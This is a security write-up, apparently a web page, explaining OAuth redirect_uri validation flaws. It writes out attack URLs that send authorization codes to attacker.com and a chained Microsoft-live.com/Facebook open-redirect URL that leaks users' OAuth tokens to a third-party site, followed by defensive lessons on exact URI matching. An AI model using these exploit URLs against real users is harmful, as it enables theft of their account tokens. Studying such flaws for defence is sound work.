<title>Redirect URI Not Validated</title>
</head><body>Redirect URI not validated<br/>
<br/>
Now let's assume an attacker:<br/>
<br/>
&nbsp; &nbsp; Registers a new client to the victim.com provider.<br/>
&nbsp; &nbsp; Registers a redirect URI like attacker.com.<br/>
<br/>
Then the attacker can craft a special URI of the form<br/>
http://victim.com/authorize?response_type=code&amp;client_id=bc88FitX1298KPj2WS259BBMa9_KCfL3&amp;scope=WRONG_SCOPE&amp;redirect_uri=http://attacker.com<br/>
<br/>
<br/>
Now you might argue that this is ONLY an open redirect and it is not much you can do with it right?<br/>
<br/>
Let's go through Microsoft and Facebook example:<br/>
<br/>
Microsoft uses a specialized OAuth scope wli.contacts_emails which is available only to Facebook’s app. An interesting part is that users are never notified that the app is trying to access their data and permission is granted silently.<br/>
<br/>
You can try this here (you’ll have to login):<br/>
<br/>
https://login.live.com/oauth20_authorize.srf?client_id=0000000044002503&amp;response_type=token&amp;scope=wli.contacts_emails&amp;redirect_uri=https%3A%2F%2Fwww.facebook.com%2F<br/>
<br/>
If you try to modify #### redirect_uri parameter you’ll notice that token is issued to any URL within #### facebook.com domain. So to leak the OAuth token to a malicious third-party an Open Redirect in #### facebook.com domain would be required. As Open Redirects are usually considered low severity vulnerabilities it's not particularly hard to find one. For this example we will utilize an Open Redirect in Facebook’s authorization flow (by providing an invalid #### scope parameter). It works like this:<br/>
<br/>
https://www.facebook.com/dialog/oauth?type=web_server&amp;scope=invalid&amp;display=popup&amp;client_id=260755904036570&amp;redirect_uri=http://simcracy.com<br/>
<br/>
So by chaining the two bugs we are able to acquire OAuth tokens from live.com users. The complete example is here:<br/>
<br/>
https://login.live.com/oauth20_authorize.srf?client_id=0000000044002503&amp;response_type=token&amp;scope=wli.contacts_emails&amp;redirect_uri=http%3A%2F%2Fwww.facebook.com%2Fl.php%3Fh%5B%5D%26u%3Dgraph.facebook.com%252Foauth%252Fauthorize%253Ftype%253Dweb_server%2526scope%253De%2526client_id%253D260755904036570%2526redirect_uri%253Dhttp%253A%252F%252Fsimcracy.com<br/>
<br/>
If you now inspect the destination URL, you'll notice that Microsoft's OAuth token was sent to a third-party website without your consent. Another example is redirection to domain XSS vulnerable page, where script can still access token.<br/>
<br/>
Lessons learned:<br/>
<br/>
&nbsp; &nbsp; OAuth implementations should never whitelist entire domains, only a few URLs so that “redirect_uri” can’t be pointed to an Open Redirect. Also developers should be careful when silently granting access to apps (manually approving an app probably will not make user experience much worse).<br/>
&nbsp; &nbsp; &#09;The ONLY safe validation method for redirect_uri the authorization server should adopt is exact matching<br/>
<br/>
&nbsp; &nbsp; If the resource owner denies the access request or if therequest fails for reasons other than a missing or invalid redirection URI, the authorization server informs the client by adding the following parameters to the query component of the redirection URI using the "application/x-www-form- urlencoded" format<br/>
<br/>
